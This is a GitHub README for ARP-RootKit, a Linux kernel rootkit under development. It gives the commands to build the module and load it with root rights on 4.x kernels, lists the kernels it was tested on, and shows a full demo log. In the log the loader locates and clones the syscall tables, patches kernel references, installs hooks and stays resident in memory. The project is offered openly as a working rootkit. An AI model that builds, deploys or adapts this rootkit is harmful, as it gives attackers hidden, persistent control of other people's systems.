# No releases yet
This software is under development.  
There's not even 1 release yet.  
  
In the commit https://github.com/D1W0U/ARP-RootKit/tree/144c7a431d07b4d9fe86c15f9cdf1a2bc9c0c53b everything is prepared to start with syscall hooking.  
Atm, I developed a way to load a linux kernel module into any version of v4.x, by patching the module and loading specially (not so much specially).  
You compile in v4.0.1 for example, or v4.15.1, and it loads. And if you change kernel, just need to patch the module, and it loads.  
  
## Testing this  
Download kernel headers, and be sure you are able to compile linux kernel modules (you've everything needed).  
  
First compile it with: `make`  
Then load by: `sudo python3 load-lkm.py arprk.ko`  
  
If you change the kernel there's no matters (but if it fails, please report). Just issue the load command.  
  
## Tested Linux Kernels

```
vmlinuz-4.0.1-040001-generic  
vmlinuz-4.1.48-040148-generic  
vmlinuz-4.2.8-040208-generic  
vmlinuz-4.3.6-040306-generic  
vmlinuz-4.4.0-101-generic  
vmlinuz-4.5.7-040507-generic  
vmlinuz-4.6.7-040607-generic  
vmlinuz-4.7.10-040710-generic  
vmlinuz-4.8.0-36-generic  
vmlinuz-4.9.80-040980-generic  
vmlinuz-4.10.0-14-generic  
vmlinuz-4.10.0-42-generic  
vmlinuz-4.11.0-13-generic  
vmlinuz-4.12.14-041214-generic  
vmlinuz-4.13.0-31-generic  
vmlinuz-4.13.0-32-generic  
vmlinuz-4.14.17-041417-generic  
vmlinuz-4.15.1-041501-generic
```

# Building deps

On Ubuntu:  
  
`$ sudo apt install make gcc python3 python3-distutils`
  
# Loading the rootkit
  
On Ubuntu:  
  
`$ sudo python3 ./load-lkm.py arprk.ko`  

# Demo
  
```
diwou@silence:~/ARP-RootKit$ sudo python3 ./load-lkm.py arprk.ko
Found possible vmlinuz /boot/vmlinuz-4.15.0-23-generic
code_start   = ffffffff81000000
code_end     = ffffffff81c031d1
rodata_start = ffffffff81e00000
rodata_end   = ffffffff821c61e2

Found sct! 548 syscalls at 0xffffffff81e001a0
Found ia32sct! 385 syscalls at 0xffffffff81e01560
sct     = ffffffff81e001a0
ia32sct = ffffffff81e01560
Found possible vmlinuz /boot/vmlinuz-4.15.0-23-generic
Possible vermagic values for /boot/vmlinuz-4.15.0-23-generic found:
[]
Patching .rela.gnu.linkonce.this_module ...
Found sct! 548 syscalls
sys_delete_module at offset .text+0x1240c0
init = 376
exit = 776
Done!
kernel_base         = ffffffffa3200000
Parameters:
image .text         = ffffffff81000000
image sct           = ffffffff81e001a0
image sct len       = 548
image ia32sct       = ffffffff81e01560
image ia32sct len   = 385
.text size          = 12595665
sys_call_table      = ffffffffa40001a0
ia32_sys_call_table = ffffffffa4001560
Found 1 refs to sys_call_table in kernel's .text
Found 2 refs to ia32_sys_call_table in kernel's .text
vmalloc_start = ffffffffc02b7000
reserved 8192 bytes at ffffffffc02b7000
my_sct zeroed!
my_sct = ffffffffc02b7000, len = 548
reserved 4096 bytes at ffffffffc02ba000.
my_ia32sct zeroed!
ia32_sct cloned at = ffffffffc02ba000
patching ref 0 of sys_call_table ffffffffa3203ad2 ...
value before patch = a40001a0
value after patch = c02b7000
patching ref 0 of ia32_sys_call_table ffffffffa3203c05 ...
value before patch = a4001560
value after patch = c02ba000
patching ref 1 of ia32_sys_call_table ffffffffa3203d75 ...
value before patch = a4001560
value after patch = c02ba000
RK's Kernel info:
kernel_len           = 14168
kernel_paglen        = 16384
kernel_pages         = 4
kernel_start         = ffffffffc0b4d000
kernel_start_pagdown = ffffffffc0b4d000
kernel_addr          = ffffffffc02bc000
kernel_addr_pagdown  = ffffffffc02bc000
Installing the rootkit's kernel ...
RK's Kernel is now installed.
Calling RK's Kernel test function (ffffffffc02bc225) ...
Hello from ARP RK Kernel!
This is the test function.

sys_call_table      = ffffffffa40001a0
ia32_sys_call_table = ffffffffa4001560
my_sct              = ffffffffc02b7000
my_ia32sct          = ffffffffc02ba000
Initializing kernel (ffffffffc02bc2b7) ...
Hello from kernel_init()!
Probably if you arrived here, I'm going to work fine! =)
Hooks installed!
Press ENTER to continue...
Unpatching syscall tables refs ...
unpatching ref 0 of sys_call_table ffffffffa3203ad2 ...
value before patch = c02b7000
value after patch = a40001a0
unpatching ref 0 of ia32_sys_call_table ffffffffa3203c05 ...
value before patch = c02ba000
value after patch = a4001560
unpatching ref 1 of ia32_sys_call_table ffffffffa3203d75 ...
value before patch = c02ba000
value after patch = a4001560
arprk.errors
256
insmod: ERROR: could not insert module arprk.ko: Operation not permitted

Done!
```
  
- NOTE: pay att. to the return -1: `insmod: ERROR: could not insert module arprk.ko: Operation not permitted` it's because rootkit is persistent in memory and we want to unload the loader (arprk.ko is the loader + rk's kernel).
  
Demo tested on:  
- Ubuntu Server Bionic Beaver  
- Linux silence 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  
- Fri Jun 22 17:18:50 UTC 2018  
